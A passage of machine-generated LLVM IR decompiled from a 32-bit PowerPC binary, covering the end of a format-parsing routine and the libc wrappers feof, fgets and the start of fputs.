  br i1 %v3_10009554, label %dec_label_pc_1000955c, label %dec_label_pc_100094ec

dec_label_pc_1000955c:                            ; preds = %dec_label_pc_10009550, %dec_label_pc_10009520
  %v0_1000955c = phi i32 [ %v2_10009548, %dec_label_pc_10009520 ], [ %v3_100094dc, %dec_label_pc_10009550 ]
  store i32 %v0_1000955c, i32* %stack_var_-96, align 4
  %v0_10009560 = load i32, i32* %r6.global-to-local, align 4
  %v1_10009560 = call i32 @__asm_rlwinm(i32 %v0_10009560, i32 30, i32 31, i32 31)
  %not.v2_10009564 = icmp eq i32 %v1_10009560, 0
  %v6_10009568 = sext i1 %not.v2_10009564 to i32
  store i32 %v6_10009568, i32* %r9.global-to-local, align 4
  %v1_1000956c = call i32 @__asm_rlwinm(i32 %v1_100094c4, i32 0, i32 20, i32 23)
  store i32 %v1_1000956c, i32* %r0.global-to-local, align 4
  %v1_10009570 = call i32 @__asm_rlwinm(i32 %v6_10009568, i32 0, i32 0, i32 27)
  store i32 %v1_10009570, i32* %r9.global-to-local, align 4
  %v0_10009574 = load i32, i32* @r30, align 4
  %v1_10009574 = inttoptr i32 %v0_10009574 to i8*
  %v2_10009574 = load i8, i8* %v1_10009574, align 1
  %v3_10009574 = zext i8 %v2_10009574 to i32
  store i32 %v3_10009574, i32* %r10.global-to-local, align 4
  %v0_10009578 = load i32, i32* %r6.global-to-local, align 4
  %v1_10009578 = call i32 @__asm_rlwinm(i32 %v0_10009578, i32 0, i32 30, i32 28)
  %v1_1000957c = add i32 %v1_10009570, 48
  store i32 %v1_1000957c, i32* %r9.global-to-local, align 4
  %v2_10009580 = or i32 %v1_10009578, %v1_1000956c
  store i32 %v2_10009580, i32* %r11.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v0_10009588 = load i32, i32* %r10.global-to-local, align 4
  %v1_10009588 = load i32, i32* @r28, align 4
  %v2_10009588 = add i32 %v1_10009588, 12
  %v3_10009588 = inttoptr i32 %v2_10009588 to i32*
  store i32 %v0_10009588, i32* %v3_10009588, align 4
  %v0_1000958c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000958c = load i32, i32* @r28, align 4
  %v2_1000958c = add i32 %v1_1000958c, 4
  %v3_1000958c = inttoptr i32 %v2_1000958c to i32*
  store i32 %v0_1000958c, i32* %v3_1000958c, align 4
  %v0_10009590 = load i32, i32* @r31, align 4
  %v1_10009590 = load i32, i32* @r28, align 4
  %v2_10009590 = add i32 %v1_10009590, 8
  %v3_10009590 = inttoptr i32 %v2_10009590 to i32*
  store i32 %v0_10009590, i32* %v3_10009590, align 4
  %v0_10009594 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009594 = load i32, i32* @r28, align 4
  %v2_10009594 = add i32 %v1_10009594, 20
  %v3_10009594 = inttoptr i32 %v2_10009594 to i32*
  store i32 %v0_10009594, i32* %v3_10009594, align 4
  %v0_10009598 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009598 = load i32, i32* @r28, align 4
  %v2_10009598 = add i32 %v1_10009598, 16
  %v3_10009598 = inttoptr i32 %v2_10009598 to i32*
  store i32 %v0_10009598, i32* %v3_10009598, align 4
  %v0_1000959c = load i32, i32* @r7, align 4
  %v1_1000959c = load i32, i32* @r28, align 4
  %v2_1000959c = add i32 %v1_1000959c, 28
  %v3_1000959c = inttoptr i32 %v2_1000959c to i32*
  store i32 %v0_1000959c, i32* %v3_1000959c, align 4
  %v0_100095a0 = load i32, i32* @r8, align 4
  %v1_100095a0 = inttoptr i32 %v0_100095a0 to i8*
  %v2_100095a0 = load i8, i8* %v1_100095a0, align 1
  %v3_100095a0 = zext i8 %v2_100095a0 to i32
  store i32 %v3_100095a0, i32* %r9.global-to-local, align 4
  %v3_100095a4 = icmp eq i8 %v2_100095a0, 0
  br i1 %v3_100095a4, label %dec_label_pc_100095ac, label %dec_label_pc_100095c4

dec_label_pc_100095ac:                            ; preds = %dec_label_pc_1000955c
  %v0_100095ac = load i32, i32* @r30, align 4
  %v1_100095ac = inttoptr i32 %v0_100095ac to i8*
  %v2_100095ac = load i8, i8* %v1_100095ac, align 1
  %v3_100095ac = zext i8 %v2_100095ac to i32
  store i32 %v3_100095ac, i32* %r0.global-to-local, align 4
  %v3_100095b0 = icmp eq i8 %v2_100095ac, 109
  br i1 %v3_100095b0, label %dec_label_pc_100095b8, label %dec_label_pc_100096fc

dec_label_pc_100095b8:                            ; preds = %dec_label_pc_100095ac
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_100095bc = load i32, i32* @r28, align 4
  %v2_100095bc = add i32 %v1_100095bc, 28
  %v3_100095bc = inttoptr i32 %v2_100095bc to i32*
  store i32 %v3_100095a0, i32* %v3_100095bc, align 4
  %v0_100095c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100095c0 = load i32, i32* @r28, align 4
  %v2_100095c0 = add i32 %v1_100095c0, 32
  %v3_100095c0 = inttoptr i32 %v2_100095c0 to i32*
  store i32 %v0_100095c0, i32* %v3_100095c0, align 4
  br label %dec_label_pc_100095c4

dec_label_pc_100095c4:                            ; preds = %dec_label_pc_1000955c, %dec_label_pc_100095b8
  %v0_100095c4 = load i32, i32* @r26, align 4
  %tmp62 = icmp slt i32 %v0_100095c4, 1
  br i1 %tmp62, label %dec_label_pc_100096a0, label %dec_label_pc_100095cc

dec_label_pc_100095cc:                            ; preds = %dec_label_pc_100095c4
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_100095d0

dec_label_pc_100095d0:                            ; preds = %dec_label_pc_10009688, %dec_label_pc_100095cc
  %v0_100095f8 = phi i32 [ 0, %dec_label_pc_100095cc ], [ %v1_1000968c, %dec_label_pc_10009688 ]
  %v2_100095d0 = icmp sgt i32 %v0_100095f8, 2
  br i1 %v2_100095d0, label %dec_label_pc_100095f4, label %dec_label_pc_100095d8

dec_label_pc_100095d8:                            ; preds = %dec_label_pc_100095d0
  %v1_100095d8 = mul i32 %v0_100095f8, 4
  store i32 %v1_100095d8, i32* %r0.global-to-local, align 4
  %v0_100095dc = load i32, i32* @r1, align 4
  %v2_100095dc = add i32 %v0_100095dc, %v1_100095d8
  store i32 %v2_100095dc, i32* %r9.global-to-local, align 4
  %v1_100095e0 = add i32 %v2_100095dc, 20
  %v2_100095e0 = inttoptr i32 %v1_100095e0 to i32*
  %v3_100095e0 = load i32, i32* %v2_100095e0, align 4
  store i32 %v3_100095e0, i32* %r0.global-to-local, align 4
  %v1_100095e4 = load i32, i32* @r28, align 4
  %v2_100095e4 = add i32 %v1_100095e4, %v0_100095f8
  store i32 %v2_100095e4, i32* %r9.global-to-local, align 4
  %v1_100095e8 = urem i32 %v3_100095e0, 256
  store i32 %v1_100095e8, i32* %r11.global-to-local, align 4
  %v1_100095ec = trunc i32 %v3_100095e0 to i8
  %v3_100095ec = add i32 %v2_100095e4, 36
  %v4_100095ec = inttoptr i32 %v3_100095ec to i8*
  store i8 %v1_100095ec, i8* %v4_100095ec, align 1
  %v0_10009600.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009600

dec_label_pc_100095f4:                            ; preds = %dec_label_pc_100095d0
  %v2_100095f8 = add i32 %v0_100095f8, %stack_var_-84.3
  store i32 %v2_100095f8, i32* %r9.global-to-local, align 4
  %v1_100095fc = add i32 %v2_100095f8, -2
  store i32 %v1_100095fc, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009600

dec_label_pc_10009600:                            ; preds = %dec_label_pc_100095d8, %dec_label_pc_100095f4
  %v0_10009620 = phi i32 [ %v0_10009600.pre, %dec_label_pc_100095d8 ], [ %v1_100095fc, %dec_label_pc_100095f4 ]
  %v1_10009600 = load i32, i32* @r26, align 4
  %v3_10009600 = icmp sgt i32 %v0_10009620, %v1_10009600
  br i1 %v3_10009600, label %dec_label_pc_10009608, label %dec_label_pc_10009614

dec_label_pc_10009608:                            ; preds = %dec_label_pc_10009600
  %v2_10009608 = icmp sgt i32 %v0_10009620, 9
  br i1 %v2_10009608, label %dec_label_pc_100096fc, label %dec_label_pc_10009610

dec_label_pc_10009610:                            ; preds = %dec_label_pc_10009608
  store i32 %v0_10009620, i32* @r26, align 4
  br label %dec_label_pc_10009614

dec_label_pc_10009614:                            ; preds = %dec_label_pc_10009600, %dec_label_pc_10009610
  store i32 %v2_100092b0.pre-phi, i32* %r9.global-to-local, align 4
  %v0_10009618 = load i32, i32* @r27, align 4
  %v1_10009618 = mul i32 %v0_10009618, 4
  store i32 %v1_10009618, i32* %r0.global-to-local, align 4
  %v2_1000961c = add i32 %v1_10009618, %v2_100092b0.pre-phi
  %v3_1000961c = inttoptr i32 %v2_1000961c to i32*
  %v4_1000961c = load i32, i32* %v3_1000961c, align 4
  store i32 %v4_1000961c, i32* @r31, align 4
  %v1_10009620 = add i32 %v0_10009620, -1
  store i32 %v1_10009620, i32* @r25, align 4
  %v1_10009624 = mul i32 %v1_10009620, 4
  %v3_10009628 = icmp eq i32 %v4_1000961c, 8
  %v1_1000962c = load i32, i32* @r28, align 4
  %v2_1000962c = add i32 %v1_1000962c, %v1_10009624
  store i32 %v2_1000962c, i32* %r9.global-to-local, align 4
  %v1_10009630 = add i32 %v2_1000962c, 40
  %v2_10009630 = inttoptr i32 %v1_10009630 to i32*
  %v3_10009630 = load i32, i32* %v2_10009630, align 4
  store i32 %v3_10009630, i32* %r3.global-to-local, align 4
  br i1 %v3_10009628, label %dec_label_pc_10009688, label %dec_label_pc_10009638

dec_label_pc_10009638:                            ; preds = %dec_label_pc_10009614
  %v3_10009638 = icmp eq i32 %v3_10009630, 8
  br i1 %v3_10009638, label %dec_label_pc_10009670, label %dec_label_pc_10009640

dec_label_pc_10009640:                            ; preds = %dec_label_pc_10009638
  %v4_10009640 = icmp eq i32 %v3_10009630, %v4_1000961c
  br i1 %v4_10009640, label %dec_label_pc_10009670, label %dec_label_pc_10009648

dec_label_pc_10009648:                            ; preds = %dec_label_pc_10009640
  %v1_10009648 = call i32 @_promoted_size(i32 %v3_10009630)
  store i32 %v1_10009648, i32* @r29, align 4
  %v0_10009650 = load i32, i32* @r31, align 4
  store i32 %v0_10009650, i32* %r3.global-to-local, align 4
  %v1_10009654 = call i32 @_promoted_size(i32 %v0_10009650)
  store i32 %v1_10009654, i32* %r3.global-to-local, align 4
  %v0_10009660 = call i32 @__asm_mfcr()
  store i32 %v0_10009660, i32* %r3.global-to-local, align 4
  store i32 %v0_10009660, i32* %r0.global-to-local, align 4
  %v1_10009664 = call i32 @__asm_rlwinm(i32 %v0_10009660, i32 31, i32 31, i32 31)
  store i32 %v1_10009664, i32* %r0.global-to-local, align 4
  %v3_10009668 = icmp eq i32 %v1_10009664, 0
  br i1 %v3_10009668, label %dec_label_pc_10009688, label %dec_label_pc_10009648.dec_label_pc_10009670_crit_edge

dec_label_pc_10009648.dec_label_pc_10009670_crit_edge: ; preds = %dec_label_pc_10009648
  %v0_10009674.pre = load i32, i32* @r27, align 4
  %v0_1000967c.pre = load i32, i32* @r25, align 4
  %v1_10009680.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10009670

dec_label_pc_10009670:                            ; preds = %dec_label_pc_10009648.dec_label_pc_10009670_crit_edge, %dec_label_pc_10009640, %dec_label_pc_10009638
  %v1_10009680 = phi i32 [ %v1_10009680.pre, %dec_label_pc_10009648.dec_label_pc_10009670_crit_edge ], [ %v1_1000962c, %dec_label_pc_10009640 ], [ %v1_1000962c, %dec_label_pc_10009638 ]
  %v0_1000967c = phi i32 [ %v0_1000967c.pre, %dec_label_pc_10009648.dec_label_pc_10009670_crit_edge ], [ %v1_10009620, %dec_label_pc_10009640 ], [ %v1_10009620, %dec_label_pc_10009638 ]
  %v0_10009674 = phi i32 [ %v0_10009674.pre, %dec_label_pc_10009648.dec_label_pc_10009670_crit_edge ], [ %v0_10009618, %dec_label_pc_10009640 ], [ %v0_10009618, %dec_label_pc_10009638 ]
  store i32 %v2_100092b0.pre-phi, i32* %r9.global-to-local, align 4
  %v1_10009674 = mul i32 %v0_10009674, 4
  store i32 %v1_10009674, i32* %r0.global-to-local, align 4
  %v2_10009678 = add i32 %v1_10009674, %v2_100092b0.pre-phi
  %v3_10009678 = inttoptr i32 %v2_10009678 to i32*
  %v4_10009678 = load i32, i32* %v3_10009678, align 4
  store i32 %v4_10009678, i32* %r0.global-to-local, align 4
  %v1_1000967c = mul i32 %v0_1000967c, 4
  %v2_10009680 = add i32 %v1_1000967c, %v1_10009680
  store i32 %v2_10009680, i32* %r9.global-to-local, align 4
  %v2_10009684 = add i32 %v2_10009680, 40
  %v3_10009684 = inttoptr i32 %v2_10009684 to i32*
  store i32 %v4_10009678, i32* %v3_10009684, align 4
  br label %dec_label_pc_10009688

dec_label_pc_10009688:                            ; preds = %dec_label_pc_10009648, %dec_label_pc_10009614, %dec_label_pc_10009670
  %v0_10009688 = load i32, i32* @r28, align 4
  %v1_10009688 = add i32 %v0_10009688, 28
  %v2_10009688 = inttoptr i32 %v1_10009688 to i32*
  %v3_10009688 = load i32, i32* %v2_10009688, align 4
  %v0_1000968c = load i32, i32* @r27, align 4
  %v1_1000968c = add i32 %v0_1000968c, 1
  store i32 %v1_1000968c, i32* @r27, align 4
  %v1_10009690 = add i32 %v3_10009688, 2
  store i32 %v1_10009690, i32* %r9.global-to-local, align 4
  %v2_10009694 = icmp slt i32 %v1_1000968c, %v1_10009690
  br i1 %v2_10009694, label %dec_label_pc_100095d0, label %dec_label_pc_100096b8

dec_label_pc_100096a0:                            ; preds = %dec_label_pc_100095c4
  %v0_100096a0 = load i32, i32* @r28, align 4
  %v1_100096a0 = add i32 %v0_100096a0, 28
  %v2_100096a0 = inttoptr i32 %v1_100096a0 to i32*
  %v3_100096a0 = load i32, i32* %v2_100096a0, align 4
  store i32 %v3_100096a0, i32* %r5.global-to-local, align 4
  %v1_100096a4 = add i32 %v0_100096a0, 40
  store i32 %v1_100096a4, i32* @r3, align 4
  %v0_100096a8 = load i32, i32* @r7, align 4
  %v1_100096a8 = trunc i32 %v0_100096a8 to i8
  %v3_100096a8 = add i32 %v0_100096a0, 38
  %v4_100096a8 = inttoptr i32 %v3_100096a8 to i8*
  store i8 %v1_100096a8, i8* %v4_100096a8, align 1
  %v2_100096ac = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_100096ac, i32* @r4, align 4
  %v0_100096b0 = load i32, i32* %r5.global-to-local, align 4
  %v1_100096b0 = mul i32 %v0_100096b0, 4
  store i32 %v1_100096b0, i32* @r5, align 4
  store i32 268474040, i32* @lr, align 4
  %v0_100096b4 = call i32 @memcpy()
  store i32 %v0_100096b4, i32* %r3.global-to-local, align 4
  %v0_100096b8.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_100096b8

dec_label_pc_100096b8:                            ; preds = %dec_label_pc_10009688, %dec_label_pc_100096a0
  %v0_100096b8 = phi i32 [ %v0_100096b8.pre, %dec_label_pc_100096a0 ], [ %v0_10009688, %dec_label_pc_10009688 ]
  %v1_100096b8 = add i32 %v0_100096b8, 16
  %v2_100096b8 = inttoptr i32 %v1_100096b8 to i32*
  %v3_100096b8 = load i32, i32* %v2_100096b8, align 4
  store i32 %v3_100096b8, i32* %r0.global-to-local, align 4
  %v0_100096bc = load i32, i32* @r26, align 4
  %v2_100096bc = add i32 %v0_100096b8, 24
  %v3_100096bc = inttoptr i32 %v2_100096bc to i32*
  store i32 %v0_100096bc, i32* %v3_100096bc, align 4
  %v0_100096c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100096c0 = and i32 %v0_100096c0, 128
  store i32 %v1_100096c0, i32* %r9.global-to-local, align 4
  %v3_100096c0 = icmp eq i32 %v1_100096c0, 0
  br i1 %v3_100096c0, label %dec_label_pc_100096c8, label %dec_label_pc_100096d4

dec_label_pc_100096c8:                            ; preds = %dec_label_pc_100096b8
  %v0_100096c8 = load i32, i32* @r30, align 4
  %v1_100096c8 = add i32 %v0_100096c8, 1
  store i32 %v1_100096c8, i32* %r0.global-to-local, align 4
  %v1_100096cc = load i32, i32* @r28, align 4
  %v2_100096cc = inttoptr i32 %v1_100096cc to i32*
  store i32 %v1_100096c8, i32* %v2_100096cc, align 4
  br label %dec_label_pc_100096ec

dec_label_pc_100096d4:                            ; preds = %dec_label_pc_100096b8
  %v2_100096d4 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_100096d4, i32* %r0.global-to-local, align 4
  %v0_100096d8 = load i32, i32* @r28, align 4
  %v1_100096d8 = inttoptr i32 %v0_100096d8 to i32*
  %v2_100096d8 = load i32, i32* %v1_100096d8, align 4
  %v1_100096dc = load i32, i32* @r30, align 4
  %v2_100096dc = sub i32 %v1_100096dc, %v2_100096d4
  %v1_100096e0 = mul i32 %v2_100096dc, 4
  store i32 %v1_100096e0, i32* %r0.global-to-local, align 4
  %v2_100096e4 = add i32 %v1_100096e0, %v2_100096d8
  store i32 %v2_100096e4, i32* %r9.global-to-local, align 4
  store i32 %v2_100096e4, i32* %v1_100096d8, align 4
  br label %dec_label_pc_100096ec

dec_label_pc_100096ec:                            ; preds = %dec_label_pc_100096c8, %dec_label_pc_100096d4
  %v0_100096ec = load i32, i32* @r28, align 4
  %v1_100096ec = add i32 %v0_100096ec, 28
  %v2_100096ec = inttoptr i32 %v1_100096ec to i32*
  %v3_100096ec = load i32, i32* %v2_100096ec, align 4
  store i32 %v3_100096ec, i32* %r9.global-to-local, align 4
  %v1_100096f0 = add i32 %v3_100096ec, 2
  br label %dec_label_pc_100096fc

dec_label_pc_100096fc:                            ; preds = %dec_label_pc_10009260, %dec_label_pc_10009334, %dec_label_pc_10009410, %dec_label_pc_10009404, %dec_label_pc_1000942c, %dec_label_pc_10009368, %dec_label_pc_10009608, %dec_label_pc_100094b8, %dec_label_pc_100095ac, %dec_label_pc_100096ec
  %storemerge2 = phi i32 [ %v1_100096f0, %dec_label_pc_100096ec ], [ -1, %dec_label_pc_100095ac ], [ -1, %dec_label_pc_100094b8 ], [ -1, %dec_label_pc_10009608 ], [ -1, %dec_label_pc_10009368 ], [ -1, %dec_label_pc_1000942c ], [ -1, %dec_label_pc_10009404 ], [ -1, %dec_label_pc_10009410 ], [ -1, %dec_label_pc_10009334 ], [ -1, %dec_label_pc_10009260 ]
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %v0_100091f8, i32* %r0.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i32 %v1_100096e0, { 1, 0 }
  uselistorder i32 %v0_100096b8, { 1, 0 }
  uselistorder i32 %v1_1000968c, { 1, 2, 0 }
  uselistorder i32 %v1_10009674, { 1, 0 }
  uselistorder i32 %v0_10009660, { 0, 2, 1 }
  uselistorder i32 %v1_1000962c, { 1, 2, 0 }
  uselistorder i32 %v1_10009620, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10009618, { 1, 0 }
  uselistorder i32 %v0_10009618, { 1, 2, 0 }
  uselistorder i32 %v3_100095e0, { 1, 0, 2 }
  uselistorder i32 %v1_100095d8, { 1, 0 }
  uselistorder i32 %v0_100095f8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10009550, { 1, 2, 0 }
  uselistorder i32 %v1_10009528, { 2, 1, 0 }
  uselistorder i32 %v1_10009514, { 0, 2, 3, 1 }
  uselistorder i32 %v1_100094f8, { 1, 0, 2 }
  uselistorder i32 %v1_100094c4, { 1, 3, 2, 0 }
  uselistorder i32 %v1_10009480, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10009444, { 0, 3, 2, 1 }
  uselistorder i32 %v1_10009430, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_100093a0, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1000939c, { 1, 0 }
  uselistorder i32 %v0_100093b4, { 1, 2, 4, 3, 5, 0 }
  uselistorder i32 %stack_var_-84.2, { 1, 0 }
  uselistorder i32 %v0_10009318, { 0, 1, 6, 4, 3, 5, 2, 7 }
  uselistorder i32 %v2_10009310, { 1, 0 }
  uselistorder i32 %v1_10009300, { 1, 0 }
  uselistorder i32 %v3_100092f8, { 1, 0, 2 }
  uselistorder i32 %v0_10009374, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_10009344, { 0, 1, 3, 2, 4, 5, 6, 7, 9, 8 }
  uselistorder i32 %v0_100092d4, { 0, 1, 3, 2 }
  uselistorder i32 %v0_100092bc, { 1, 0 }
  uselistorder i32 %v2_100092b0.pre-phi, { 0, 4, 1, 3, 2 }
  uselistorder i32 %v1_10009290, { 1, 0 }
  uselistorder i32 %v1_10009278, { 1, 2, 0 }
  uselistorder i32 %v0_1000926c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 2, 0, 1 }
  uselistorder i32* %stack_var_-96, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32* %r6.global-to-local, { 2, 3, 0, 4, 1, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 4, 5, 6, 7, 8, 9, 1 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 5, 6, 7, 11, 4, 12, 8, 9, 10 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_10012984.586 to i32), { 3, 0, 1, 2 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_10012944.585 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 0, 3, 4, 2, 5, 1, 6, 7 }
  uselistorder i32* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100096fc, { 9, 6, 8, 7, 4, 2, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_100096ec, { 1, 0 }
  uselistorder label %dec_label_pc_100096b8, { 1, 0 }
  uselistorder label %dec_label_pc_10009688, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009614, { 1, 0 }
  uselistorder label %dec_label_pc_10009600, { 1, 0 }
  uselistorder label %dec_label_pc_100095c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000950c, { 1, 0 }
  uselistorder label %dec_label_pc_100094b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10009468, { 1, 0 }
  uselistorder label %dec_label_pc_1000943c, { 1, 0 }
  uselistorder label %dec_label_pc_100093f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100093ec, { 1, 0 }
  uselistorder label %dec_label_pc_10009360, { 1, 0 }
  uselistorder label %dec_label_pc_10009358, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100092f8, { 1, 0 }
  uselistorder label %dec_label_pc_100092f4, { 1, 0 }
  uselistorder label %dec_label_pc_100092e0, { 1, 0 }
  uselistorder label %dec_label_pc_100092c0, { 1, 0 }
  uselistorder label %dec_label_pc_100092bc, { 1, 0 }
  uselistorder label %dec_label_pc_100092a0, { 1, 0 }
}

define i32 @feof(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10009718 = call i32 @__asm_mfcr()
  store i32 %v0_10009718, i32* %r31.global-to-local, align 4
  %v2_1000973c = add i32 %v0_10009718, 52
  %v3_1000973c = inttoptr i32 %v2_1000973c to i32*
  %v4_1000973c = load i32, i32* %v3_1000973c, align 4
  %v2_10009740 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10009740, i32* @r3, align 4
  %v3_10009744 = icmp eq i32 %v4_1000973c, 0
  store i1 %v3_10009744, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10009744, label %dec_label_pc_10009758, label %dec_label_pc_10009758.thread

dec_label_pc_10009758.thread:                     ; preds = %entry
  %v1_100097603 = inttoptr i32 %v0_10009718 to i16*
  %v2_100097604 = load i16, i16* %v1_100097603, align 2
  %v3_100097605 = zext i16 %v2_100097604 to i32
  store i32 %v3_100097605, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000976c

dec_label_pc_10009758:                            ; preds = %entry
  %v0_1000974c = call i32 @__pthread_return_void()
  %v0_10009754 = call i32 @__pthread_return_0()
  %v0_10009760.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10009764.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  store i32 %v2_10009740, i32* @r3, align 4
  %v1_10009760 = inttoptr i32 %v0_10009760.pre to i16*
  %v2_10009760 = load i16, i16* %v1_10009760, align 2
  %v3_10009760 = zext i16 %v2_10009760 to i32
  store i32 %v3_10009760, i32* %r31.global-to-local, align 4
  br i1 %v0_10009764.pre, label %dec_label_pc_10009768, label %dec_label_pc_1000976c

dec_label_pc_10009768:                            ; preds = %dec_label_pc_10009758
  %v0_10009768 = call i32 @__pthread_return_void()
  br label %dec_label_pc_1000976c

dec_label_pc_1000976c:                            ; preds = %dec_label_pc_10009758.thread, %dec_label_pc_10009758, %dec_label_pc_10009768
  %v3_100097606 = phi i32 [ %v3_100097605, %dec_label_pc_10009758.thread ], [ %v3_10009760, %dec_label_pc_10009758 ], [ %v3_10009760, %dec_label_pc_10009768 ]
  %v1_10009770 = call i32 @__asm_rlwinm(i32 %v3_100097606, i32 0, i32 29, i32 29)
  %v1_10009780 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10009718)
  %v9_10009780 = extractvalue %0 %v1_10009780, 7
  store i4 %v9_10009780, i4* @cr4, align 1
  ret i32 %v1_10009770

; uselistorder directives
  uselistorder i32 %v0_10009718, { 3, 0, 1, 2 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000976c, { 2, 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10009794 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* %r31.global-to-local, align 4
  store i32 %v0_10009794, i32* %r28.global-to-local, align 4
  %v1_100097b8 = add i32 %arg3, 52
  %v2_100097b8 = inttoptr i32 %v1_100097b8 to i32*
  %v3_100097b8 = load i32, i32* %v2_100097b8, align 4
  %v2_100097bc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100097bc, i32* @r3, align 4
  %v3_100097c8 = icmp eq i32 %v3_100097b8, 0
  store i1 %v3_100097c8, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_100097c8, label %dec_label_pc_100097d0, label %dec_label_pc_100097dc

dec_label_pc_100097d0:                            ; preds = %entry
  %v0_100097d0 = call i32 @__pthread_return_void()
  %v0_100097d8 = call i32 @__pthread_return_0()
  %v0_100097dc.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_100097e0.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_100097e4.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100097dc

dec_label_pc_100097dc:                            ; preds = %entry, %dec_label_pc_100097d0
  %v0_100097e4 = phi i32 [ %v0_10009794, %entry ], [ %v0_100097e4.pre, %dec_label_pc_100097d0 ]
  %v0_100097e0 = phi i32 [ %arg3, %entry ], [ %v0_100097e0.pre, %dec_label_pc_100097d0 ]
  %v0_100097dc = phi i32 [ %arg2, %entry ], [ %v0_100097dc.pre, %dec_label_pc_100097d0 ]
  store i32 268474348, i32* @lr, align 4
  %v3_100097e8 = inttoptr i32 %v0_100097e4 to i8*
  %v4_100097e8 = call i32 @__GI_fgets_unlocked(i8* %v3_100097e8, i32 %v0_100097dc, i32 %v0_100097e0)
  store i32 %v4_100097e8, i32* @r31, align 4
  store i32 %v2_100097bc, i32* @r3, align 4
  %v0_100097f8 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100097f8, label %dec_label_pc_100097fc, label %dec_label_pc_10009800

dec_label_pc_100097fc:                            ; preds = %dec_label_pc_100097dc
  %v0_100097fc = call i32 @__pthread_return_void()
  %v0_10009804.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009800

dec_label_pc_10009800:                            ; preds = %dec_label_pc_100097dc, %dec_label_pc_100097fc
  %v0_10009804 = phi i32 [ %v4_100097e8, %dec_label_pc_100097dc ], [ %v0_10009804.pre, %dec_label_pc_100097fc ]
  %v1_10009814 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10009794)
  %v9_10009814 = extractvalue %0 %v1_10009814, 7
  store i4 %v9_10009814, i4* @cr4, align 1
  ret i32 %v0_10009804

; uselistorder directives
  uselistorder i32 %v0_10009794, { 1, 0, 2 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10009800, { 1, 0 }
  uselistorder label %dec_label_pc_100097dc, { 1, 0 }
}

define i32 @__GI_fputs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r29.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10009828 = call i32 @__asm_mfcr()
